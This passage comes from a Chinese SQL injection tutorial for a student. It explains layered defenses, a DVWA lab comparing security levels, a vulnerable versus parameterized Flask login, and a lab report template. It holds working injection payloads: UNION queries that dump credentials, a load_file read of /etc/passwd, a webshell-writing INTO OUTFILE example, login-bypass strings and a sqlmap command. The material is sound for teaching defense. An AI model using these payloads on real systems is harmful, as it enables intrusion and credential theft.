        输入 %df%27 → 转义后变成 %df%5c%27
        但 GBK 里 %df%5c 是一个合法汉字 → 把转义的 \ 吃掉了
        → %27（单引号）又裸露出来了 → 注入成功 ❌
     ★ 数据库连接字符集设错就会出现这个问题

★★★ 结论: 转义是"打补丁"，参数化才是"改设计"
```

---

## 🏅 5.4 第四层：最小权限

### 🍽️ 比喻

```
❌ 错误做法：给仓库管理员【整个仓库的总钥匙】
     → 他被人骗了，整个仓库都没了

✅ 正确做法：只给他【一个货架】的钥匙，而且只能"看"不能"改"
     → 就算被骗，损失只有一个货架

★★ 对数据库来说:
     网站程序连接数据库用的账号，权限要【刚好够用】
```

### 具体怎么做

```sql
-- ❌ 错误：网站用 root 连数据库
--   → 一旦被注入，攻击者可以: 读文件、写webshell、删库、提权

-- ✅ 正确：建一个专用账号，只给必要权限
CREATE USER 'webapp'@'localhost' IDENTIFIED BY '强密码';
GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.* TO 'webapp'@'localhost';
-- ★ 注意这里没有: FILE / DROP / CREATE / GRANT / SUPER
FLUSH PRIVILEGES;
```

**★★ 为什么这条特别重要？看对比：**

| 权限 | 被注入后攻击者能做什么 |
|---|---|
| 有 `FILE` 权限 | ★ `load_file('/etc/passwd')` 读服务器任意文件<br>★ `INTO OUTFILE '/var/www/shell.php'` 写木马 |
| 有 `DROP` 权限 | ★ `DROP TABLE users` 直接删库 |
| 有 `GRANT` 权限 | ★ 给自己加权限，持久化 |
| 有 `SUPER` 权限 | ★ 提权 |
| **只有 SELECT** | 只能读这一个库的这几张表 |

**★ 你可以自己试：**
```
在 DVWA 的 SQL Injection 里输入:
    0' UNION SELECT load_file('/etc/passwd'), 2 #

→ 如果报错说"FILE privilege"之类 → 说明 DVWA 的数据库账号权限设得对 ✅
→ 如果真读出了 /etc/passwd 内容 → 说明权限过大 ⚠️
```

---

## 🎖️ 5.5 第五层：关闭错误回显

### 🍽️ 比喻

```
❌ 错误做法：后厨一噎住就大喊:
     "第 3 步找不到列 'user_id'，SQL 是 SELECT ... WHERE ..."

★ 相当于把【后厨的图纸】念给顾客听
★ 顾客听到"列名是 user_id"、"只有 2 列" → 下次攻击更精准

✅ 正确做法：后厨出问题只跟经理（日志）说，顾客只看到"系统繁忙"
```

### 代码

```php
// ❌ 错误：把错误直接显示给用户
if (!$result) {
    die("Query failed: " . mysqli_error($conn));    // ← 泄露 SQL 结构
}

// ✅ 正确：详细信息写日志，用户只看到通用提示
if (!$result) {
    error_log("SQL Error: " . mysqli_error($conn));   // 写进日志文件
    die("系统繁忙，请稍后再试");                        // 用户只看到这个
}
```

```ini
; php.ini
display_errors = Off          ; ★ 生产环境必须关
log_errors = On               ; 错误写日志
error_log = /var/log/php_errors.log
```

**★ 注意：关错误回显是"降低危害"，不是"修复漏洞"**
```
★ 它让攻击者"盲注"（看不到报错，只能靠真/假或时间判断）
★ 但盲注一样能脱库，只是慢一点
★ 所以它是【辅助手段】，不能替代参数化
```

---

## 🏵️ 5.6 第六层：WAF / RASP

### 🍽️ 比喻

```
★ WAF (Web Application Firewall) = 门口保安
     检查每个进来的顾客，看有没有带可疑的东西
     → 拦掉大部分"照着手册来"的攻击者

★ RASP (Runtime Application Self-Protection) = 后厨里的监控
     盯着程序运行时有没有异常行为
     → 更准，但要在服务器上装
```

### 常见 WAF

| 产品 | 类型 | 说明 |
|---|---|---|
| ModSecurity + OWASP CRS | 开源 | 装在 Nginx/Apache 上 |
| 云 WAF | 云服务 | 阿里云/腾讯云/Cloudflare |
| 安全狗 / 宝塔WAF | 国产 | 服务器上装 |
| 长亭雷池 | 国产开源 | 好用 |

**★★★ 但一定要记住：**
```
★★ WAF 是【缓解措施】，不是【修复】
★ 攻击者可以用编码绕过、分块传输绕过、注释绕过……
★ 真正解决问题必须改代码（参数化查询）
★ WAF 的价值: 争取时间，挡住自动化扫描器
```

---

## 🎗️ 5.7 第七层：代码审计 + 自动化测试

### 🍽️ 比喻

```
★ 定期检查服务员有没有偷懒
★ 而且要【在顾客发现之前】自己先检查一遍
```

### 怎么做

```
【开发阶段】
  · Code Review 时专门看 SQL 拼接（搜 f"SELECT、+ "SELECT、$query =）
  · 用 SAST 工具扫源码（SonarQube、Semgrep、CodeQL）
  · 强制代码规范: 禁止字符串拼接 SQL

【测试阶段】
  · 用 sqlmap 对自己的网站做测试（★ 已授权的情况下）
  · 用 DAST 工具（AWVS、Burp Scanner、OWASP ZAP）

【上线后】
  · 定期用扫描器复测
  · 监控异常 SQL 日志（大量 UNION SELECT 就是可疑信号）
```

### ★ 合法地测自己的网站

```powershell
# 用 sqlmap 测自己搭的站（★ 只能测自己的！）
sqlmap -u "http://192.168.131.132:42001/vulnerabilities/sqli/?id=1&Submit=Submit" ^
       --cookie="PHPSESSID=xxx; security=low" ^
       --batch --dbs
```

**★★★ 重要：未经授权对他人网站做这些，是【违法犯罪】**
```
《刑法》第 285 条: 非法侵入计算机信息系统罪
《网络安全法》第 27 条: 禁止非法侵入他人网络、干扰他人网络正常功能

★ 你现在的 DVWA 是【自己搭的靶场】→ 合法 ✅
★ 学校实验平台如果有授权 → 合法 ✅
★ 别人的网站 → ❌ 违法，别碰
```

---

# 🔬 第六章：★ 动手实验 —— 亲眼看到防御生效

**★ 回到 DVWA，把同一个 payload 在 4 个等级都试一遍。这是整个教程最有价值的一个实验。**

## 实验方法

```
① DVWA → 左侧菜单 → DVWA Security → 选等级 → Submit
② 回到 SQL Injection → 输入同样的 payload → 看结果
③ 记录: 成功 / 失败 / 报错
```

## 实验记录表（★ 照着填）

**★ payload 统一用这几个：**
```
A:  1' OR '1'='1
B:  1' UNION SELECT user, password FROM users #
C:  1 OR 1=1
D:  0' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() #
```

| payload | Low | Medium | High | Impossible |
|---|---|---|---|---|
| A `1' OR '1'='1` | ✅ 成功 | ❓ | ❓ | ❓ |
| B `1' UNION SELECT user,password...` | ✅ 成功 | ❓ | ❓ | ❓ |
| C `1 OR 1=1` | ❌ 失败（字符型） | ❓ | ❓ | ❓ |
| D 查表名 | ✅ 成功 | ❓ | ❓ | ❓ |

**★ 自己去填这张表 —— 填完你就真正理解了防御**

## 各等级用了什么防御（做完实验再对答案）

| 等级 | 防御手段 | 比喻 |
|---|---|---|
| **Low** | 无 | 傻服务员，照抄 |
| **Medium** | `mysqli_real_escape_string()` + `str_replace` 过滤 `<script>`<br>★ 但 `id` 是**数字型**拼接（没加引号） | 服务员会把顾客的话"套壳"，<br>但这次空格旁边没引号了 |
| **High** | `mysqli_real_escape_string()` + 严格限制输入长度<br>★ 用 `LIMIT 1` 只返回一行 | 服务员警觉了，而且每次只端一道菜 |
| **Impossible** | `stripslashes` + `mysqli_real_escape_string` + `is_numeric` 三重<br>★ **并且用参数化查询** | ★ 完美好服务员：给固定表格 |

## 实验后你应该能回答的问题

```
① 为什么 Medium 等级用 payload C（1 OR 1=1）反而能成功？
   → 提示: Medium 的 id 是【数字型】拼接，不需要引号闭合

② 为什么 High 等级 UNION 脱库变难了？
   → 提示: LIMIT 1 只让后厨端一道菜出来

③ 为什么 Impossible 等级连报错都没有？
   → 提示: is_numeric 直接把非法输入拒了，根本不会去查数据库

④ 如果让你给一个网站做防御，你会先做哪一层？
   → 答案: 参数化查询（第一层），因为它一次改完不漏
```

---

# 🧪 第七章：在你的 Flask 项目里防（对应你的登录页）

**★ 你的 `D:\study\flask-login\app.py` 现在用的是正确写法，我给你看对比：**

## ❌ 有漏洞的写法（教学演示用）

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    conn = get_db()
    # ★★★ 危险：f-string 直接拼接
    sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    row = conn.execute(sql).fetchone()

    if row:
        session['user'] = row['username']
        return redirect('/welcome')
    return render_template('login.html', error='用户名或密码错误')
```

**🍽️ 比喻：服务员把顾客口述的话直接抄给后厨**

**★ 攻击方法：**
```
用户名输入: admin' --
密码输入:  随便填

拼出来的 SQL:
    SELECT * FROM users WHERE username = 'admin' --' AND password = '随便填'
                                              ↑ 后面的密码判断被注释掉了！
    → 直接以 admin 身份登录 ✅

★ 这就是"万能密码"的经典手法
★ 用户名输入: ' OR '1'='1' --    也能绕过
```

## ✅ 正确的写法（你现在的代码）

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    conn = get_db()
    # ★★★ 正确：参数化查询，? 是占位符
    row = conn.execute(
        'SELECT * FROM users WHERE username = ? AND password = ?',
        (username, password)          # ★ 参数单独传，不拼进 SQL
    ).fetchone()

    if row:
        session['user'] = row['username']
        return redirect('/welcome')
    return render_template('login.html', error='用户名或密码错误')
```

**🍽️ 比喻：给顾客一张印好的固定表格，他只能往空格里填字**

**★ 同样的攻击：**
```
用户名输入: admin' --
→ SQL 变成:
    SELECT * FROM users WHERE username = ? AND password = ?
    参数 1 = "admin' --"
    参数 2 = "随便填"

→ 数据库理解成"找个用户名【正好叫】 admin' -- 的用户"
→ 查不到 → 登录失败 ✅
```

## ★ 顺便：密码存储也该改

```python
# ❌ 现在你的代码（教学够用，真实项目不行）
row = conn.execute('SELECT * FROM users WHERE username=? AND password=?',
                   (username, password)).fetchone()
# ★ 密码是明文存的！数据库被拖走就全泄露

# ✅ 正确做法：存哈希 + 加盐
from werkzeug.security import generate_password_hash, check_password_hash

# 注册时
hashed = generate_password_hash(password)      # ★ 自动加盐，用 pbkdf2/scrypt
conn.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, hashed))

# 登录时
user = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
if user and check_password_hash(user['password'], password):   # ★ 比对哈希
    session['user'] = user['username']
```

**★★ 这就是你密码学课学的"加盐慢哈希"，和 hashcat 那篇实验对应上了：**
```
★ 明文存储  → 数据库泄露 = 密码全泄露
★ MD5 存储  → hashcat 273 亿次/秒，弱密码瞬间破
★ 加盐 + bcrypt → hashcat 3.7 万次/秒，弱密码也要 45 分钟
★ 加盐 + bcrypt + 12位密码 → 几百万年
```

---

# ✅ 第八章：防御检查清单（照着审自己的代码）

**★ 拿这张表去检查你自己的项目：**

```
【代码层】
□ 所有 SQL 查询都用参数化查询（? 或 %s 占位符）？
□ 搜索代码里有没有这些东西（都是拼接信号）:
     f"SELECT      f'SELECT
     + "SELECT     .format(     %s 直接格式化
     $query = "    String.format
□ 如果必须用原生 SQL，输入做了类型校验吗？
□ 排序字段（ORDER BY）不能参数化 → 用【白名单】映射
     例: 只允许 ['id','name','date'] 里的值

【数据库层】
□ 网站程序连接数据库用的是【专用账号】而不是 root？
□ 这个账号只有 SELECT/INSERT/UPDATE/DELETE，没有 FILE/DROP/GRANT？
□ 数据库端口没有暴露到公网？
□ 连接字符集设置正确（防止宽字节注入）？

【配置层】
□ 生产环境 display_errors = Off？
□ 错误信息写进日志而不是返回给用户？
□ 数据库报错不会直接显示在页面上？

【密码存储】
□ 密码不是明文存储？
□ 不是用 MD5/SHA1 存储？（这两种太快，能被暴力破解）
□ 用了 bcrypt / argon2 / scrypt 这类慢哈希？
□ 每个用户有独立的随机盐？

【运维层】
□ 有 WAF 或至少做了基础防护？
□ 有异常监控（大量 UNION SELECT 是危险信号）？
□ 定期做安全测试（SAST/DAST）？
□ 定期检查依赖库的漏洞（pip audit / npm audit）？
```

**★★ 最重要的三条（如果只能做三件事）：**
```
1. ★★★ 所有 SQL 用参数化查询
2. ★★  数据库账号最小权限（别用 root）
3. ★★  密码用慢哈希 + 加盐存储
```

---

# 📝 第九章：实验报告模板（可直接交作业）

```markdown
# DVWA SQL 注入实验报告

## 一、实验环境
- 靶场：DVWA（Damn Vulnerable Web Application）
- 地址：http://192.168.131.132:42001
- 后端：PHP 8.4.24 + MariaDB 11.8.9（Debian）
- 安全等级：Low
- 工具：Chrome DevTools

## 二、实验目标
利用 SQL 注入漏洞获取数据库中的用户账号和密码

## 三、实验步骤与结果

### 3.1 判断是否存在注入
| 输入 | 返回 | 结论 |
|---|---|---|
| 1 | admin/admin | 正常查询 |
| 1' | 报错/空白 | ★ 存在注入漏洞 |

### 3.2 判断注入类型
| 输入 | 返回 | 结论 |
|---|---|---|
| 1 AND 1=1 | 空 | 非数字型 |
| 1' AND '1'='1 | admin | 字符型，单引号闭合 |
| 1' AND '1'='2 | 空 | 条件可控 |

### 3.3 判断字段数（列数）
| 输入 | 返回 |
|---|---|
| 1' ORDER BY 2 # | 正常 |
| 1' ORDER BY 3 # | 报错 → 共 2 列 |

### 3.4 确定回显位置
输入：0' UNION SELECT 111,222 #
返回：First name: 111，Surname: 222

### 3.5 信息收集
| 目标 | Payload | 结果 |
|---|---|---|
| 当前库/用户 | 0' UNION SELECT database(),user() # | dvwa / dvwa@localhost |
| 数据库版本 | 0' UNION SELECT version(),@@version_compile_os # | 11.8.9-MariaDB-2 from Debian |
| 表名 | 0' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() # | users |
| 字段名 | 0' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users' # | user_id,first_name,...,user,password,... |

### 3.6 获取用户数据（脱库）
Payload：
0' UNION SELECT group_concat(user,0x3a,password SEPARATOR 0x0a),2 FROM users #

结果：
| 用户名 | 密码哈希 | 明文 |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |

## 四、漏洞成因
Low 等级下，用户输入被直接拼接进 SQL 语句：
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
输入 1' 后单引号闭合了原有引号，后续内容被当作 SQL 代码执行。
根因：程序未能区分"SQL 结构"与"用户数据"，把用户输入当成了指令。

## 五、防御实验（对比四个安全等级）
| Payload | Low | Medium | High | Impossible |
|---|---|---|---|---|
| 1' OR '1'='1 | 成功 | | | |
| 1' UNION SELECT user,password FROM users # | 成功 | | | |
| 1 OR 1=1 | 失败 | | | |
| 0' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() # | 成功 | | | |

各等级采用的防御机制：
| 等级 | 防御手段 | 效果 |
|---|---|---|
| Low | 无 | 完全可注入 |
| Medium | mysqli_real_escape_string + str_replace | 引号型注入失效，但数字型仍可注入 |
| High | 转义 + LIMIT 1 限制返回行数 | 注入困难，脱库受限 |
| Impossible | stripslashes + 转义 + is_numeric 类型校验 + 参数化查询 | 完全无法注入 |

## 六、防御建议
按重要性排序（前三条必须做）：

1. ★★★ 使用参数化查询 / 预编译（根本解法）
   将 SQL 结构与用户数据分离，用户输入永远只作为"值"参与查询
   例：$stmt = $conn->prepare("SELECT ... WHERE user_id = ?");
       $stmt->bind_param("s", $id);

2. ★★ 最小权限原则
   网站程序使用专用数据库账号，仅授予 SELECT/INSERT/UPDATE/DELETE
   禁止授予 FILE（可读写文件）、DROP（可删库）、GRANT（可提权）、SUPER

3. ★★ 输入验证（白名单）
   user_id 必须是数字：is_numeric($id) 或 (int)$id
   参数应为数字时，直接强制类型转换即可杜绝注入

4. 转义特殊字符（辅助手段，非根本解法）
   mysqli_real_escape_string()，但存在宽字节注入等绕过风险

5. 关闭错误回显
   生产环境 display_errors = Off，错误详情写入日志
   避免向攻击者泄露 SQL 结构与数据库信息

6. 部署 WAF（缓解措施）
   可拦截自动化扫描，但不能替代代码层修复

7. 安全的密码存储
   不使用 MD5/SHA1，改用 bcrypt/argon2/scrypt 慢哈希 + 每用户独立盐

## 七、实验心得
（自己写：哪一步卡住了、哪个 payload 最意外、防御对比实验的发现）
```

---

# 🎯 第十章：一句话总回顾（全用比喻）

## 攻击部分（五句话）

```
★★★ 整个攻击实验就是五句话:

① 判断注入   = 在后厨的纸条上多写一个 ' ，看他会不会噎住
② 判断类型   = 看空格旁边有没有引号，有就先把它"关上"
③ 判断列数   = 量一下后厨的窗口有几个格子
④ 找回显位   = 试出哪几个格子能看见你的东西
⑤ 脱库       = 先翻仓库账本（找货架名、抽屉名），
               再让后厨把整个抽屉搬出来
```

## 🛡️ 防御部分（七句话）

```
★★★ 七层防御，从"改设计"到"打补丁":

① 参数化查询   = 给顾客一张【印好的固定表格】他只能填字
                 ★★★ 根本解，一次改完不漏
② 输入验证     = 后厨说"我们只有 1-5 号套餐"，其他一律不接
                 ★ 白名单（只允许安全的）比黑名单（挡危险的）强
③ 转义特殊字符 = 把顾客写的字【套层壳】，让它变成纯文字
                 ★ 是补丁，有宽字节注入等绕过方式
④ 最小权限     = 仓管只给【一个货架】的钥匙，不给整仓库
                 ★ 就算被骗，损失也有限
⑤ 关错误回显   = 后厨出问题只跟经理说，别喊给顾客听
                 ★ 让攻击变"盲注"，但不阻止攻击
⑥ WAF/RASP    = 门口保安 + 后厨监控
                 ★ 缓解措施，不能替代改代码
⑦ 代码审计     = 定期检查服务员有没有偷懒
                 ★ 上线前自己先用 sqlmap 测一遍
```

## ★★★ 核心一句话

```
★★ 攻击视角:
     傻服务员（字符串拼接）会把你的话当【指令】
     好服务员（参数化查询）只把你的话当【内容】

★★ 防御视角:
     漏洞的本质 = 程序【分不清】哪部分是 SQL 结构、哪部分是用户数据
     防御的本质 = 把这两者【彻底分开】

     · 参数化查询 → 从设计上分开     ★ 最有效
     · 输入验证   → 让数据里压根不含危险字符
     · 转义       → 把危险字符变成普通字符
     · 最小权限   → 就算分不开，也别让它造成大损失
```

## ★★ 你现在能回答的三个问题

```
① 为什么"加引号包起来"不算防御？
   → 因为顾客可以自己写一个 ' 把引号关上

② 为什么"转义"不如"参数化"？
   → 转义容易漏（200 处查询漏 1 处就是漏洞）、
     和数据库类型绑定、有宽字节绕过
     参数化是结构性的，写完就不会漏

③ 如果只能做一件事，做什么？
   → 把所有 SQL 改成参数化查询
```

---

**★ 现在去把安全等级设成 Low，从 `1'` 开始试；**
**★ 做完攻击实验，再把四个等级都试一遍，亲眼看到防御生效 🎯**

